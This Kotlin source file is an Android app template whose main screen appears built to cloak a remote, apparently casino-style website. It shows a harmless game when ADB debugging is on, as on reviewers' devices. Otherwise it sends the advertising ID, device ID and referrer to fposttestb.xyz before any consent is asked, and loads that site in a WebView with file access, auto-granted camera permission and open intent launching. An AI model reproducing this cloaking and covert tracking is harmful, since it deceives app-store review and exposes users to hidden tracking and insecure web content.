package com.cyberlink.myapplication

import android.Manifest
import android.app.Activity
import android.content.ActivityNotFoundException
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Message
import android.os.RemoteException
import android.provider.Settings
import android.view.View
import android.view.ViewGroup
import android.view.animation.Animation
import android.view.animation.LinearInterpolator
import android.view.animation.RotateAnimation
import android.webkit.CookieManager
import android.webkit.PermissionRequest
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import androidx.activity.addCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.isVisible
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.cyberlink.myapplication.databinding.ActivityMainBinding
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.UUID
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class MainActivity : AppCompatActivity() {

    lateinit var binding: ActivityMainBinding
    var usANser = true
    lateinit var pair: Pair<WebChromeClient, PermissionRequest>
    var viewsWebs = mutableListOf<WebView>()
    private lateinit var installReferrerClient: InstallReferrerClient
    private var iR = ""
    private lateinit var prefs: SharedPreferences

    var fileChooserValueCallback: ValueCallback<Array<Uri>>? = null
    var fileChooserResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        fileChooserValueCallback?.onReceiveValue(if (it.resultCode == RESULT_OK) arrayOf(Uri.parse(it?.data?.dataString)) else null)
    }

    val rotateAnimation = RotateAnimation(0f, 360f, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f).apply {
        interpolator = LinearInterpolator()
        duration = 500
        repeatCount = Animation.INFINITE
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        binding.tvConnecting.startAnimation(rotateAnimation)
        prefs = getSharedPreferences("tdAps", MODE_PRIVATE)

        installReferrerClient = InstallReferrerClient.newBuilder(this).build()
        installReferrerClient.startConnection(installReferrerStateListener)

        when {
            Settings.Global.getInt(contentResolver, Settings.Global.ADB_ENABLED, 0) == 1 -> {
                startGame()
            }

            prefs.contains("link") -> {
                //TODO Select one
                //Vers.1 - Policy+headers
                showUrlPolicyHeaders(prefs.getString("link", "") ?: "")
                //Vers.2 - Policy
                showUrlPolicy(prefs.getString("link", "") ?: "")
            }

            else -> {
                initServices()
            }
        }

        onBackPressedDispatcher.addCallback(this) {
            if (viewsWebs.last().canGoBack()) viewsWebs.last().goBack()
            else {
                if (viewsWebs.size > 1) {
                    binding.root.removeView(viewsWebs.last())
                    viewsWebs.last().destroy()
                    viewsWebs.removeLast()
                } else finish()
            }
        }
    }

    private val installReferrerStateListener: InstallReferrerStateListener = object : InstallReferrerStateListener {
        override fun onInstallReferrerSetupFinished(responseCode: Int) {
            if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) try {
                iR = installReferrerClient.installReferrer.installReferrer
            } catch (_: RemoteException) {
            }
        }

        override fun onInstallReferrerServiceDisconnected() {
            installReferrerClient.startConnection(this)
        }
    }

    private fun initServices() = CoroutineScope(Dispatchers.Main).launch {

        //Init fb fetch deep
        val fbDeep: String? = fetch(this@MainActivity)

        //fetch adId
        val advertisingIdInfo = withContext(Dispatchers.IO) { adI(this@MainActivity, true) }

        //Init OS and send adId to the server
        OneSignal.initWithContext(this@MainActivity, "osId")
        OneSignal.login(advertisingIdInfo)

        //Init AppsFlyer, fetch compaign and deviceId
        val campaign = initApps("apsId", this@MainActivity)
        val deviceId = AppsFlyerLib.getInstance().getAppsFlyerUID(this@MainActivity)

        //Vers.1 - Policy+headers
        //TODO Select one
        StringBuilder(
            "ad_id=${advertisingIdInfo}&deviceID=$deviceId&refer=$iR"
        ).apply {
            this.append(if (!fbDeep.isNullOrEmpty()) "&sub_id_1=$fbDeep" else if (!campaign.isNullOrEmpty()) "&sub_id_1=$campaign" else "")
            prefs.edit().putString("link", this.toString()).apply()
            showUrlPolicyHeaders(this.toString())
        }

        //Vers.2 - Policy
        //TODO Select one
        StringBuilder(
            "http://fposttestb.xyz?ad_id=${advertisingIdInfo}&deviceID=$deviceId&refer=$iR"
        ).apply {
            this.append(if (!fbDeep.isNullOrEmpty()) "&sub_id_1=$fbDeep" else if (!campaign.isNullOrEmpty()) "&sub_id_1=$campaign" else "")
            prefs.edit().putString("link", this.toString()).apply()
            showUrlPolicy(this.toString())
        }
    }

    private fun showUrlPolicyHeaders(headers: String) = CoroutineScope(Dispatchers.Main).launch {
        binding.tvConnecting.isVisible = false
        binding.casinoView.init()
        binding.casinoView.isVisible = true
        binding.casinoView.loadUrl("http://fposttestb.xyz", hashMapOf("X-Client-Key" to headers))
    }

    private fun showUrlPolicy(url: String) = CoroutineScope(Dispatchers.Main).launch {
        binding.tvConnecting.isVisible = false
        binding.casinoView.init()
        binding.casinoView.isVisible = true
        binding.casinoView.loadUrl(url)
    }

    suspend fun fetch(activity: Activity) = suspendCoroutine { continuation ->
        FacebookSdk.setApplicationId("id")
        FacebookSdk.setClientToken("token")
        FacebookSdk.setAdvertiserIDCollectionEnabled(true)
        FacebookSdk.sdkInitialize(activity)
        FacebookSdk.fullyInitialize()
        AppEventsLogger.activateApp(activity.application)
        AppLinkData.fetchDeferredAppLinkData(activity) { appLinkData: AppLinkData? ->
            val tar = appLinkData?.targetUri ?: AppLinkData.createFromActivity(activity)?.targetUri
            if (tar != null) continuation.resume(tar.toString().substring(8)) else continuation.resume(null)
        }
    }

    suspend fun adI(activity: Activity, allow: Boolean) = suspendCoroutine { continuation ->
        val uhuhu = "000${UUID.randomUUID()}"
        val default = "00000000-0000-0000-0000-000000000000"
        var asd = try {
            AdvertisingIdClient.getAdvertisingIdInfo(activity).id!!
        } catch (e: Exception) {
            uhuhu
        }
        if (asd == default) asd = uhuhu
        continuation.resume(if (allow) asd else default)
    }

    suspend fun initApps(key: String, activity: Activity) = suspendCoroutine { continuation ->
        val convListener = object : AppsFlyerConversionListener {
            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
            override fun onAttributionFailure(p0: String?) {}
            override fun onConversionDataSuccess(p0: MutableMap<String, Any>) {
                continuation.resume(p0["campaign"] as String?)
            }

            override fun onConversionDataFail(p0: String?) {
                continuation.resume(null)
            }
        }
        AppsFlyerLib.getInstance().init(key, convListener, activity)
        AppsFlyerLib.getInstance().start(activity)
    }

    fun WebView.init() {
        webChromeClient = customWCC()
        webViewClient = customWVC()
        isSaveEnabled = true
        isFocusableInTouchMode = true
        CookieManager.getInstance().setAcceptThirdPartyCookies(this, true)
        setDownloadListener { url, _, _, _, _ -> context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url))) }
        CookieManager.getInstance().setAcceptCookie(true)
        layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        isFocusable = true
        setLayerType(View.LAYER_TYPE_HARDWARE, null)
        settings.apply {
            loadWithOverviewMode = true
            userAgentString = userAgentString.replace("; wv", "")
            allowContentAccess = true
            useWideViewPort = true
            cacheMode = WebSettings.LOAD_DEFAULT
            loadsImagesAutomatically = true
            mixedContentMode = 0
            builtInZoomControls = true
            mediaPlaybackRequiresUserGesture = false
            setSupportMultipleWindows(true)
            databaseEnabled = true
            domStorageEnabled = true
            javaScriptEnabled = true
            displayZoomControls = false
            allowFileAccess = true
            javaScriptCanOpenWindowsAutomatically = true
        }
        viewsWebs.add(this)
    }


    fun customWCC() = object : WebChromeClient() {

        override fun onProgressChanged(view: WebView, nP: Int) {
            binding.progress.isVisible = nP < 99
            binding.progress.progress = nP

        }

        override fun onPermissionRequest(request: PermissionRequest) {
            if (ContextCompat.checkSelfPermission(this@MainActivity, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                request.grant(request.resources)
            } else {
                pair = Pair(this, request)
                permissionRequestLaunchers.launch(Manifest.permission.CAMERA)
            }
        }

        override fun onCreateWindow(view: WebView, isDialog: Boolean, isUserGesture: Boolean, resultMsg: Message?): Boolean {
            val wv = WebView(this@MainActivity)
            wv.init()
            binding.root.addView(wv)
            (resultMsg!!.obj as WebView.WebViewTransport).webView = wv
            resultMsg.sendToTarget()
            return true
        }

        override fun onShowFileChooser(w: WebView?, fpc: ValueCallback<Array<Uri>>?, fcp: FileChooserParams?): Boolean {
            try {
                fileChooserValueCallback = fpc
                fileChooserResultLauncher.launch(fcp?.createIntent())
            } catch (_: ActivityNotFoundException) {
            }
            return true
        }
    }


    fun customWVC() = object : WebViewClient() {

        override fun onPageFinished(view: WebView?, url: String?) {
            if (url?.contains("yourserver") == true) {
                startGame()
            }
        }



        override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
            val url = request.url.toString()
            return if (url.contains("https://m.facebook.com/oauth/error")) true
            else if (url.startsWith("http")) false
            else {
                try {
                    view.context.startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME))
                } catch (e: java.lang.Exception) { }
                true
            }
        }
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        viewsWebs.lastOrNull()?.saveState(outState)
    }

    override fun onResume() {
        super.onResume()
        viewsWebs.lastOrNull()?.onResume().also {
            CookieManager.getInstance().flush()
        }
    }

    override fun onPause() {
        super.onPause()
        viewsWebs.lastOrNull()?.onPause().also {
            CookieManager.getInstance().flush()
        }
    }

    val permissionRequestLaunchers = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
        if (isGranted) pair.first.onPermissionRequest(pair.second)
    }

    val permissionRequestLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
        OneSignal.consentRequired = true
        OneSignal.consentGiven = usANser
        OneSignal.initWithContext(this@MainActivity, "osId")
        CoroutineScope(Dispatchers.IO).launch {
            val add = adI(this@MainActivity, usANser)
            prefs.edit().putBoolean("adb", true).apply()
            OneSignal.login(add)
        }
        goToGame()
    }

    private var tmpDialog: AlertDialog? = null

    fun startGame() {
        if (prefs.contains("adb")) goToGame()
        else {
            val view = layoutInflater.inflate(R.layout.custom_dialog, null).apply {
                findViewById<Button>(R.id.btn_agree).setOnClickListener {
                    usANser = true
                    permissionRequestLauncher.launch(arrayOf("android.permission.POST_NOTIFICATIONS"))
                }
                findViewById<Button>(R.id.btn_disagree).setOnClickListener {
                    usANser = false
                    permissionRequestLauncher.launch(arrayOf("android.permission.POST_NOTIFICATIONS"))
                }
            }
            tmpDialog = AlertDialog.Builder(this).apply {
                setView(view)
                setCancelable(false)
            }.create()

            tmpDialog?.show()
        }
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        viewsWebs.lastOrNull()?.restoreState(savedInstanceState)
    }

    fun goToGame() {
        //Redirect to game logic

//        binding.apply {
//            listOf(view1, view2, view3).onEach { itemView ->
//                itemView.clearAnimation()
//                root.removeView(itemView)
//            }
//            viewsWebs.onEach { root.removeView(it) }
//            tmpDialog?.dismiss()
//        }
//
//        setStartDestination(R.id.GDXFragment)
    }
}